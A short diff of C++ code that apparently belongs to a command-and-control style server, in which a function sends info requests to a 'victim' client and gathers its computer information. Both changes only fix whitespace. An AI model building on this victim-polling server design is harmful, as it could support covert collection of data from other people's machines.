@@ -18,7 +18,7 @@ bool tcp_server::request_info(client& victim, bool request)
 		// Make a request for every query
 
 		for (auto keyval : victim.computer_info) {
-			console << "Send Request(" << keyval.first << ") -> "<< format_error(tcp_server::send(victim, keyval.first, "Info Request")).code << "\n";
+			console << "Send Request(" << keyval.first << ") -> " << format_error(tcp_server::send(victim, keyval.first, "Info Request")).code << "\n";
 		}
 
 	}
@@ -42,7 +42,7 @@ bool tcp_server::request_info(client& victim, bool request)
 				// Check request for every query
 
 				for (auto item : items_fetch) {
-					
+
 					// Find packet in packet_queue
 
 					auto search = std::find_if(victim.packet_queue.begin(), victim.packet_queue.end(),
